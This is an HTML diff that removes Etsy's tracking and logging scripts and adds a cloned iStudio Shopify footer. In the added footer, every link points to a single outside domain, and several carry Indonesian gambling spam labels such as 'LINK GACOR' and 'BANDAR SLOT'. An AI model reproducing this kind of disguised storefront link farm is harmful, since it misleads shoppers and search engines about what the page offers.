+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    LINK GACOR
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    BANDAR SLOT
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="footer-block grid__item footer-block--menu">
+                        <p class="footer-block__heading inline-richtext">Services</p>
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Services
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Corporate
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Demo Sessions
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Elush Service Provider
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Financing Options
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Trade-in
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Travellers Reservation
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="footer-block grid__item footer-block--menu">
+                        <p class="footer-block__heading inline-richtext">Support</p>
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    My Account
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Collection & Delivery
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Returns & Exchanges
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Contact Us
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    FAQ
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Privacy Policy
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Site Terms of Use
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="footer-block grid__item footer-block--menu">
+                        <p class="footer-block__heading inline-richtext">About iStudio</p>
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    About Us
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Find an iStudio near you
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Why Shop at iStudio
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Elush Corporate Website
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="footer-block grid__item">
+                        <p class="footer-block__heading inline-richtext">RESULT MACAU & BANDAR TOTO MACAU</p>
+                        <div class="subtext_css footer-block__details-content rte">
+
+                        </div>
+                        <div class="footer_logos">
+                            <div class="footerLogo ">
+                                <div class="ratio" style="--ratio-percent: 46.97508896797152%">
+                                    <img srcset="https://ik.imagekit.io/ck1mayks8/logo-slot.webp?updatedAt=1770202951934"
+                                        src="https://ik.imagekit.io/ck1mayks8/logo-slot.webp?updatedAt=1770202951934"
+                                        alt="" loading="lazy" width="120" height="auto"
+                                        style="max-width: min(100%, 120px); height: 42px;">
+                                </div>
+                            </div>
+                            <div class="footerLogo "><svg class="placeholder-svg placeholder"
+                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 525.5 525.5">
+                                    <path
+                                        d="M324.5 212.7H203c-1.6 0-2.8 1.3-2.8 2.8V308c0 1.6 1.3 2.8 2.8 2.8h121.6c1.6 0 2.8-1.3 2.8-2.8v-92.5c0-1.6-1.3-2.8-2.9-2.8zm1.1 95.3c0 .6-.5 1.1-1.1 1.1H203c-.6 0-1.1-.5-1.1-1.1v-92.5c0-.6.5-1.1 1.1-1.1h121.6c.6 0 1.1.5 1.1 1.1V308z" />
+                                    <path
+                                        d="M210.4 299.5H240v.1s.1 0 .2-.1h75.2v-76.2h-105v76.2zm1.8-7.2l20-20c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l1.5 1.5 16.8 16.8c-12.9 3.3-20.7 6.3-22.8 7.2h-27.7v-5.5zm101.5-10.1c-20.1 1.7-36.7 4.8-49.1 7.9l-16.9-16.9 26.3-26.3c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l27.5 27.5v7.8zm-68.9 15.5c9.7-3.5 33.9-10.9 68.9-13.8v13.8h-68.9zm68.9-72.7v46.8l-26.2-26.2c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-26.3 26.3-.9-.9c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-18.8 18.8V225h101.4z" />
+                                    <path
+                                        d="M232.8 254c4.6 0 8.3-3.7 8.3-8.3s-3.7-8.3-8.3-8.3-8.3 3.7-8.3 8.3 3.7 8.3 8.3 8.3zm0-14.9c3.6 0 6.6 2.9 6.6 6.6s-2.9 6.6-6.6 6.6-6.6-2.9-6.6-6.6 3-6.6 6.6-6.6z" />
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="page-width footer_newsletter_icon_section">
+                    <div class="footer-block__newsletter">
+                        <p class="footer-block__heading2 inline-richtext">Subscribe to our emails</p>
+                        <form method="post" action="/contact#ContactFooter" id="ContactFooter" accept-charset="UTF-8"
+                            class="footer__newsletter newsletter-form"><input type="hidden" name="form_type"
+                                value="customer" /><input type="hidden" name="utf8" value="✓" /><input type="hidden"
+                                name="contact[tags]" value="newsletter">
+                            <div class="emailTextBoxFooter1 newsletter-form__field-wrapper">
+                                <div class="field">
+                                    <input id="NewsletterForm--sections--17605520064692__footer" type="email"
+                                        name="contact[email]" class="emailTextBoxFooter1 field__input" value=""
+                                        aria-required="true" autocorrect="off" autocapitalize="off" autocomplete="email"
+                                        placeholder="Email" required>
+                                    <label class="email_label_css field__label"
+                                        for="NewsletterForm--sections--17605520064692__footer">
+                                        Email
+                                    </label>
+                                    <button type="submit" class="newsletter-form__button field__button" name="commit"
+                                        id="Subscribe" aria-label="Subscribe" data-form-type="footer-newsletter">
+                                        <svg viewBox="0 0 14 10" fill="none" aria-hidden="true" focusable="false"
+                                            class="footer_mail_arrow icon icon-arrow"
+                                            xmlns="http://www.w3.org/2000/svg">
+                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                fill="currentColor">
+                                        </svg>
+
+                                    </button>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="footer__content-bottom">
+                        <div class="footer__content-bottom-wrapper ">
+                            <div class=" footer__column footer__column--info">
+                                <ul class="ulClassSocialIcon footer__list-social list-unstyled list-social">
+                                    <li class="social_icon_footer list-social__item-f">
+                                        <a href="https://tunari-online.ro/"
+                                            class="social_icon_anchor link list-social__link"><svg aria-hidden="true"
+                                                focusable="false" class="icon icon-facebook" viewBox="0 0 20 20">
+                                                <path fill="currentColor"
+                                                    d="M18 10.049C18 5.603 14.419 2 10 2c-4.419 0-8 3.603-8 8.049C2 14.067 4.925 17.396 8.75 18v-5.624H6.719v-2.328h2.03V8.275c0-2.017 1.195-3.132 3.023-3.132.874 0 1.79.158 1.79.158v1.98h-1.009c-.994 0-1.303.621-1.303 1.258v1.51h2.219l-.355 2.326H11.25V18c3.825-.604 6.75-3.933 6.75-7.951Z" />
+                                            </svg>
+                                            <span class="visually-hidden">Facebook</span>
+                                        </a>
+                                    </li>
+                                    <li class="social_icon_footer list-social__item-f">
+                                        <a href="https://tunari-online.ro/"
+                                            class="social_icon_anchor link list-social__link"><svg aria-hidden="true"
+                                                focusable="false" class="icon icon-instagram" viewBox="0 0 20 20">
+                                                <path fill="currentColor" fill-rule="evenodd"
+                                                    d="M13.23 3.492c-.84-.037-1.096-.046-3.23-.046-2.144 0-2.39.01-3.238.055-.776.027-1.195.164-1.487.273a2.43 2.43 0 0 0-.912.593 2.486 2.486 0 0 0-.602.922c-.11.282-.238.702-.274 1.486-.046.84-.046 1.095-.046 3.23 0 2.134.01 2.39.046 3.229.004.51.097 1.016.274 1.495.145.365.319.639.602.913.282.282.538.456.92.602.474.176.974.268 1.479.273.848.046 1.103.046 3.238.046 2.134 0 2.39-.01 3.23-.046.784-.036 1.203-.164 1.486-.273.374-.146.648-.329.921-.602.283-.283.447-.548.602-.922.177-.476.27-.979.274-1.486.037-.84.046-1.095.046-3.23 0-2.134-.01-2.39-.055-3.229-.027-.784-.164-1.204-.274-1.495a2.43 2.43 0 0 0-.593-.913 2.604 2.604 0 0 0-.92-.602c-.284-.11-.703-.237-1.488-.273ZM6.697 2.05c.857-.036 1.131-.045 3.302-.045 1.1-.014 2.202.001 3.302.045.664.014 1.321.14 1.943.374a3.968 3.968 0 0 1 1.414.922c.41.397.728.88.93 1.414.23.622.354 1.279.365 1.942C18 7.56 18 7.824 18 10.005c0 2.17-.01 2.444-.046 3.292-.036.858-.173 1.442-.374 1.943-.2.53-.474.976-.92 1.423a3.896 3.896 0 0 1-1.415.922c-.51.191-1.095.337-1.943.374-.857.036-1.122.045-3.302.045-2.171 0-2.445-.009-3.302-.055-.849-.027-1.432-.164-1.943-.364a4.152 4.152 0 0 1-1.414-.922 4.128 4.128 0 0 1-.93-1.423c-.183-.51-.329-1.085-.365-1.943C2.009 12.45 2 12.167 2 10.004c0-2.161 0-2.435.055-3.302.027-.848.164-1.432.365-1.942a4.44 4.44 0 0 1 .92-1.414 4.18 4.18 0 0 1 1.415-.93c.51-.183 1.094-.33 1.943-.366Zm.427 4.806a4.105 4.105 0 1 1 5.805 5.805 4.105 4.105 0 0 1-5.805-5.805Zm1.882 5.371a2.668 2.668 0 1 0 2.042-4.93 2.668 2.668 0 0 0-2.042 4.93Zm5.922-5.942a.958.958 0 1 1-1.355-1.355.958.958 0 0 1 1.355 1.355Z"
+                                                    clip-rule="evenodd" />
+                                            </svg>
+                                            <span class="visually-hidden">Instagram</span>
+                                        </a>
+                                    </li>
+                                    <li class="social_icon_footer list-social__item-f">
+                                        <a href="https://tunari-online.ro/"
+                                            class="social_icon_anchor link list-social__link"><svg aria-hidden="true"
+                                                focusable="false" class="icon icon-youtube" viewBox="0 0 20 20">
+                                                <path fill="currentColor"
+                                                    d="M18.16 5.87c.34 1.309.34 4.08.34 4.08s0 2.771-.34 4.08a2.125 2.125 0 0 1-1.53 1.53c-1.309.34-6.63.34-6.63.34s-5.321 0-6.63-.34a2.125 2.125 0 0 1-1.53-1.53c-.34-1.309-.34-4.08-.34-4.08s0-2.771.34-4.08a2.173 2.173 0 0 1 1.53-1.53C4.679 4 10 4 10 4s5.321 0 6.63.34a2.173 2.173 0 0 1 1.53 1.53ZM8.3 12.5l4.42-2.55L8.3 7.4v5.1Z" />
+                                            </svg>
+                                            <span class="visually-hidden">YouTube</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                                <div class="footer__payment">
+                                    <span class="visually-hidden">Payment methods</span>
+                                    <ul class="footerPayment list list-payment">
+                                        <li class="paymenticon list-payment__item">
+                                            <svg class="icon icon--full-color" xmlns="http://www.w3.org/2000/svg"
+                                                role="img" aria-labelledby="pi-american_express" viewBox="0 0 38 24"
+                                                width="38" height="24">
+                                                <title id="pi-american_express">American Express</title>
+                                                <path fill="#000"
+                                                    d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3Z"
+                                                    opacity=".07" />
+                                                <path fill="#006FCF"
+                                                    d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32Z" />
+                                                <path fill="#FFF"
+                                                    d="M22.012 19.936v-8.421L37 11.528v2.326l-1.732 1.852L37 17.573v2.375h-2.766l-1.47-1.622-1.46 1.628-9.292-.02Z" />
+                                                <path fill="#006FCF"
+                                                    d="M23.013 19.012v-6.57h5.572v1.513h-3.768v1.028h3.678v1.488h-3.678v1.01h3.768v1.531h-5.572Z" />
+                                                <path fill="#006FCF"
+                                                    d="m28.557 19.012 3.083-3.289-3.083-3.282h2.386l1.884 2.083 1.89-2.082H37v.051l-3.017 3.23L37 18.92v.093h-2.307l-1.917-2.103-1.898 2.104h-2.321Z" />
+                                                <path fill="#FFF"
+                                                    d="M22.71 4.04h3.614l1.269 2.881V4.04h4.46l.77 2.159.771-2.159H37v8.421H19l3.71-8.421Z" />
+                                                <path fill="#006FCF"
+                                                    d="m23.395 4.955-2.916 6.566h2l.55-1.315h2.98l.55 1.315h2.05l-2.904-6.566h-2.31Zm.25 3.777.875-2.09.873 2.09h-1.748Z" />
+                                                <path fill="#006FCF"
+                                                    d="M28.581 11.52V4.953l2.811.01L32.84 9l1.456-4.046H37v6.565l-1.74.016v-4.51l-1.644 4.494h-1.59L30.35 7.01v4.51h-1.768Z" />
+                                            </svg>
+
+                                        </li>
+                                        <li class="paymenticon list-payment__item">
+                                            <svg class="icon icon--full-color" viewBox="0 0 38 24"
+                                                xmlns="http://www.w3.org/2000/svg" role="img" width="38" height="24"
+                                                aria-labelledby="pi-master">
+                                                <title id="pi-master">Mastercard</title>
+                                                <path opacity=".07"
+                                                    d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z" />
+                                                <path fill="#fff"
+                                                    d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32" />
+                                                <circle fill="#EB001B" cx="15" cy="12" r="7" />
+                                                <circle fill="#F79E1B" cx="23" cy="12" r="7" />
+                                                <path fill="#FF5F00"
+                                                    d="M22 12c0-2.4-1.2-4.5-3-5.7-1.8 1.3-3 3.4-3 5.7s1.2 4.5 3 5.7c1.8-1.2 3-3.3 3-5.7z" />
+                                            </svg>
+                                        </li>
+                                        <li class="paymenticon list-payment__item">
+                                            <svg class="icon icon--full-color" viewBox="0 0 38 24"
+                                                xmlns="http://www.w3.org/2000/svg" role="img" width="38" height="24"
+                                                aria-labelledby="pi-visa">
+                                                <title id="pi-visa">Visa</title>
+                                                <path opacity=".07"
+                                                    d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z" />
+                                                <path fill="#fff"
+                                                    d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32" />
+                                                <path
+                                                    d="M28.3 10.1H28c-.4 1-.7 1.5-1 3h1.9c-.3-1.5-.3-2.2-.6-3zm2.9 5.9h-1.7c-.1 0-.1 0-.2-.1l-.2-.9-.1-.2h-2.4c-.1 0-.2 0-.2.2l-.3.9c0 .1-.1.1-.1.1h-2.1l.2-.5L27 8.7c0-.5.3-.7.8-.7h1.5c.1 0 .2 0 .2.2l1.4 6.5c.1.4.2.7.2 1.1.1.1.1.1.1.2zm-13.4-.3l.4-1.8c.1 0 .2.1.2.1.7.3 1.4.5 2.1.4.2 0 .5-.1.7-.2.5-.2.5-.7.1-1.1-.2-.2-.5-.3-.8-.5-.4-.2-.8-.4-1.1-.7-1.2-1-.8-2.4-.1-3.1.6-.4.9-.8 1.7-.8 1.2 0 2.5 0 3.1.2h.1c-.1.6-.2 1.1-.4 1.7-.5-.2-1-.4-1.5-.4-.3 0-.6 0-.9.1-.2 0-.3.1-.4.2-.2.2-.2.5 0 .7l.5.4c.4.2.8.4 1.1.6.5.3 1 .8 1.1 1.4.2.9-.1 1.7-.9 2.3-.5.4-.7.6-1.4.6-1.4 0-2.5.1-3.4-.2-.1.2-.1.2-.2.1zm-3.5.3c.1-.7.1-.7.2-1 .5-2.2 1-4.5 1.4-6.7.1-.2.1-.3.3-.3H18c-.2 1.2-.4 2.1-.7 3.2-.3 1.5-.6 3-1 4.5 0 .2-.1.2-.3.2M5 8.2c0-.1.2-.2.3-.2h3.4c.5 0 .9.3 1 .8l.9 4.4c0 .1 0 .1.1.2 0-.1.1-.1.1-.1l2.1-5.1c-.1-.1 0-.2.1-.2h2.1c0 .1 0 .1-.1.2l-3.1 7.3c-.1.2-.1.3-.2.4-.1.1-.3 0-.5 0H9.7c-.1 0-.2 0-.2-.2L7.9 9.5c-.2-.2-.5-.5-.9-.6-.6-.3-1.7-.5-1.9-.5L5 8.2z"
+                                                    fill="#142688" />
+                                            </svg>
+                                        </li>
+                                        <li class="paymenticon list-payment__item" style='width:auto;'>
+                                            <img src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/payment_badge_green.png?v=1753250452"
+                                                height="24">
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="copyrightCss footer__copyright caption">
+                                    <span class="copyright__content">&copy; 2026, <a
+                                            href="https://tunari-online.ro/"
+                                            title="SLOT">SLOT</a></span>
+                                    <span class="copyright__content"><a target="_blank" rel="nofollow">Powered by SEO
+                                            STUDENT</a></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <script>
+            var acc = document.getElementsByClassName('accordion2');
+            var i;
+            $(document).on('click', '.accordion2', function () {
+                this.classList.toggle('active_2');
+                this.classList.toggle('headerBlu');
+                var panel2 = this.nextElementSibling;
+                $(panel2.style.maxHeight);
+                if (panel2.style.maxHeight) {
+                    panel2.style.maxHeight = null;
+                    $(this).find('span').removeClass('svgrotate');
+                } else {
+                    panel2.style.maxHeight = panel2.scrollHeight + 'px';
+                    $(this).find('span').addClass('svgrotate');
+                }
+            });
+        </script>
+    </div>
+    <section id="shopify-section-sections--17605520064692__collapsible_content_xjDGLy"
+        class="shopify-section shopify-section-group-footer-group section">
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-accordion.css?v=114305622551526091581742784887"
+            rel="stylesheet" type="text/css" media="all" />
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/collapsible-content.css?v=127502585749033803951742784889"
+            rel="stylesheet" type="text/css" media="all" />
+        <style data-shopify>
+            .section-sections--17605520064692__collapsible_content_xjDGLy-padding {
+                padding-top: 27px;
+                padding-bottom: 27px;
+            }
+
+            @media screen and (min-width: 750px) {
+                .section-sections--17605520064692__collapsible_content_xjDGLy-padding {
+                    padding-top: 36px;
+                    padding-bottom: 36px;
+                }
+            }
+        </style>
+        <div class="color-background-1 gradient">
+            <div
+                class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
+            </div>
+        </div>
+        </div>
+
+
+    </section>
+    <!-- END sections: footer-group -->
+
+
+
+
+
+
+    <ul hidden>
+        <li id="a11y-refresh-page-message">Choosing a selection results in a full page refresh.</li>
+        <li id="a11y-new-window-message">Opens in a new window.</li>
+    </ul>
+
+    <script>
+        window.themeJsData = {
+            templateName: "product",
+            templateStrip: "product",
+            cartItemCount: 0,
+            shopCurrency: 'SGD',
+        }
+    </script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/theme.js?v=35343184324329019891742784888"
+        defer="defer"></script>
+    <script>
+        window.shopUrl = 'https://tunari-online.ro/';
+        window.routes = {
+            cart_add_url: '/cart/add',
+            cart_change_url: '/cart/change',
+            cart_clear_url: '/cart/clear',
+            cart_update_url: '/cart/update',
+            cart_url: '/cart',
+            account_addresses_url: '/account/addresses',
+            account_login_url: '/account/login',
+            account_logout_url: '/account/logout',
+            account_recover_url: '/account/recover',
+            account_register_url: '/account/register',
+            account_url: '/account',
+            predictive_search_url: '/search/suggest',
+        };
+
+        window.cartStrings = {
+            error: `There was an error while updating your cart. Please try again.`,
+            quantityError: `You can only add [quantity] of this item to your cart.`,
+            storeConfirmationMessage: 'Confirm store at checkout',
+        };
+
+        window.variantStrings = {
+            addToCart: `Add to cart`,
+            soldOut: `Out of Stock`,
+            unavailable: `Unavailable`,
+            unavailable_with_option: `[value] - Unavailable`,
+        };
+
+        window.quickOrderListStrings = {
+            itemsAdded: `[quantity] items added`,
+            itemAdded: `[quantity] item added`,
+            itemsRemoved: `[quantity] items removed`,
+            itemRemoved: `[quantity] item removed`,
+            viewCart: `View cart`,
+            each: `[money]/ea`,
+        };
+
+        window.accessibilityStrings = {
+            imageAvailable: `Image [index] is now available in gallery view`,
+            shareSuccess: `Link copied to clipboard`,
+            pauseSlideshow: `Pause slideshow`,
+            playSlideshow: `Play slideshow`,
+            recipientFormExpanded: `Gift card recipient form expanded`,
+            recipientFormCollapsed: `Gift card recipient form collapsed`,
+        };
+
+        window.deliveryOptionsStrings = { "en": { "Usually ready in 1 hour": "Usually ready in 1 hour", "Usually ready in 2 hours": "Usually ready in 2 hours", "Usually ready in 4 hours": "Usually ready in 4 hours", "Usually ready in 24 hours": "Usually ready in 24 hours", "Usually ready in 2-4 days": "Usually ready in 2-4 days", "Temporarily Unavailable for Pickup": "Temporarily Unavailable for Pickup" } };
+    </script>
+
+
+
+
+    <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-notify-modal.css?v=121279191211236621751742784888"
+        rel="stylesheet" type="text/css" media="all" />
+
+
+
+
+    <aside id="notifyModal" class="modal ac-moda">
+
+        <form class="modal__inner modal__inner--notify">
+            <header class="modal__header">
+                <button id="notifyModalClose" type="button" class="modal__close modal-close-button">
+                    <span class="modal-close-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                            <path
+                                d="M12.12,10l4.07-4.06a1.5,1.5,0,1,0-2.11-2.12L10,7.88,5.94,3.81A1.5,1.5,0,1,0,3.82,5.93L7.88,10,3.81,14.06a1.5,1.5,0,0,0,0,2.12,1.51,1.51,0,0,0,2.13,0L10,12.12l4.06,4.07a1.45,1.45,0,0,0,1.06.44,1.5,1.5,0,0,0,1.06-2.56Z">
+                            </path>
+                        </svg>
+                    </span>
+                    <span class="screenreader">Close</span>
+                </button>
+                <h3 class="modal__title js-notify-title" data-default="Don’t miss out when this item becomes available!"
+                    data-success="You will be notified when it becomes available.">Don’t miss out when this item becomes
+                    available!</h3>
+                <div class="modal__success hide js-notify-title-success hide">
+
+                    <h3 class="modal__title" data-default="Don’t miss out when this item becomes available!">You will be
+                        notified when it becomes available.</h3>
+                </div>
+            </header>
+
+            <div class="modal__inner-content">
+                <p class="modal__inner-content-p js-notify-content">Enter your email address to be notified when this
+                    item is back in stock.</p>
+                <input class="modal__input js-notify-input" type="email" aria-label="Email">
+                <div class="modal__input--error js-notify-error">
+                    <span class="hide js-notify-general-error-text">Unable to subscribe to updates. Please try again
+                        later.</span>
+                    <span class="hide js-notify-duplicate-request-error-text">You are already subscribed</span>
+                    <span class="hide js-notify-error-request-error-text">You must enter an email to subscribe to
+                        product updates.</span>
+                </div>
+            </div>
+            <button
+                class="modal__submit modal__submit--notify button button--full-width button--primary js-notify-submit"
+                type="button">
+                <span class="screenreader">Submit</span>
+                <span class="modal__submit-text">Notify me</span>
+            </button>
+            <button
+                class="modal__submit modal__submit--notify button button--full-width button--primary hide js-notify-success-button"
+                type="button">
+                <span class="screenreader">Close</span>
+                <span class="modal__submit-text">Done</span>
+            </button>
+        </form>
+
+        <div class="notify-modal__overlay modal-page-overlay js-notify-overlay"></div>
+    </aside>
+
+    <style>
+        .modal__submit.modal__submit--notify {
+            background-color: #ff9900;
+        }
+
+
+        .modal__submit.modal__submit--notify {
+            color: #FFFFFF;
+        }
+    </style>
+    <div class="seedkit-component-standalone">
+        <a class="ac-modal-trigger hidden js-net-monthly-pricing-modal-trigger"
+            data-modal-target="modal-net-monthly-pricing-modal">Learn More<i
+                class="fa-solid fa-angle-right billboard_icon"></i></a>
+
+        <div id="modal-net-monthly-pricing-modal" class="ac-modal" data-type="content" data-width="wide"
+            data-variant="pageOverlay" data-modal-dialog-label="Modal" data-modal-close-label="Close Modal">
+
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-nmp-test-mode.css?v=20702808579977612711742784887"
+                rel="stylesheet" type="text/css" media="all" />
+
+            <nmp-test-mode class="nmp-test-mode  js-nmp-test-mode" data-frequency="/mo. for {{ per_month }} mo.">
+                <div class="nmp-test-mode__heading" id="modal-headline">
+                    <h2>How does Financing work? </h2>
+                    <p>Get what you want now, pay for it later!</p>
+                    <p>Shopping online made so much more accessible now with PayLater by Grab.</p>
+                </div>
+
+                <h3 class="nmp-test-mode__title">Explore options</h3>
+                <div class="nmp-test-mode__plan">
+                    <div class="js-nmp-terms">
+                        <i class="fa fa-spinner fa-spin"></i>
+                    </div>
+                </div>
+            </nmp-test-mode>
+
+            <script src="//www.istudiosg.com/cdn/shop/t/14/assets/nmp-test-mode.js?v=52863412589471034481742784889"
+                defer="defer"></script>
+
+
         </div>
     </div>
-</div>
-
-    <script type="text/html" data-gdpr-consent-success-alert>
-        <div class="wt-alert wt-alert--success-01 wt-alert--fixed-floating wt-alert--fixed-bottom wt-mb-xs-4">
-            <div class="wt-display-flex-xs">
-                <p class="wt-text-body-01 wt-text-left-xs">Privacy settings saved</p>
-            </div>
-        </div>
-    </script>
-</div>
-
-        <div data-dialog-content>
-            
-        </div>
-
-        <div id="wt-portals"></div>
-
-        <div id="etsy-modal-container" aria-hidden="true"></div>
 
 
-        <div id="google-tag-manager-container" aria-hidden="true">
-            <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
-        window.dataLayer = [
-    {
-        "tp_consent": "yes",
-        "Language": "en-GB",
-        "Region": "ID",
-        "Currency": "IDR",
-        "UAID": "3risB690iqgVMEj0sW3Jxya5aa04",
-        "DetectedRegion": "ID",
-        "uuid": 1758149096,
-        "request_start_time": 1758149096,
-        "emFbPixel": "11a9d82b0db08ee1bdf5e8874494add873c5e08f7c49597639cd462e03210ab5",
-        "user_id": 1135369000,
-        "uIdFbPixel": "27ad29c17d0610967b5ee7cab259740e2db56c93b1264ce9ec6dd6883b6c660b",
-        "externalID": "01772304ca7c493afa29b5226d64be13e19da719f2e2a21509c309907967fb22",
-        "fbp": "fb.1.1758102790268.6288693550444878"
-    } 
-];
-    </script>
 
-    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-KWW5SS"
-                    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <script nonce='gPiNOjdRCrWLas5Ik2CuS+N0'>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-        '//www.googletagmanager.com/gtm.js?id='+i+dl;var n=d.querySelector('[nonce]');
-        n&&j.setAttribute('nonce',n.nonce||n.getAttribute('nonce'));f.parentNode.insertBefore(j,f);
-        })(window,document,'script','dataLayer','GTM-KWW5SS');</script>
-        </div>
 
-        
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/share.js?v=19406306419835735731742784889"
+        defer="defer"></script>
+    <style>
+        .header__heading {
+            align-items: center;
+        }
 
-        <script type='text/javascript' nonce='gPiNOjdRCrWLas5Ik2CuS+N0'>
-    window.__etsy_logging=window.__etsy_logging||{perf:{}};window.__etsy_logging.url="\/\/www.etsy.com\/bcn\/beacon";window.__etsy_logging.defaults={"ab":{"xplat.runtime_config_service.ramp":["on","x","b4354c"],"orm_latency":["off","x","091448"],"ltv_tactics.extended_session_ttl_6mo":["on","w","575c58"],"fastly.cdn_experiment_framework_aa":["off","m","79b68d"],"neu_runtime_tracing_always_on":["off","x","106c3b"],"neu_runtime_tracing":["off","w","6631e5"],"structured_data_attributes_order_dependent":["on","x","691833"],"payments.vat.dont_cache_region":["off","x","1ed96c"],"payments.vat.region_override":["off","x","e81d25"],"google_tag_manager":["on","x","43dc13"],"site_chrome\/buyer_to_seller_navbar_signed_out":["ineligible","e","0efe99"],"checkout.gift_card_cta_in_search_dropdown":["on","x","931866"],"local_pe.q3_2024.search.browser.traffic_split":["on","x","33df41"],"ranking\/search.experience.xml_autosuggest_v4":["all_xml","x","2b2623"],"lingtools\/trending_searches.gcp":["ineligible","e","5cfa03"],"user_persistent_experiment.q3_2025":["global_holdout_continuous","w","7803c7"],"collections.user_experiments.search_bar_shops":["off","x","75df5a"],"site_chrome\/buyer_to_seller_navbar_signed_in":["ineligible","e","67649b"],"persistent_experiment.q3_2025"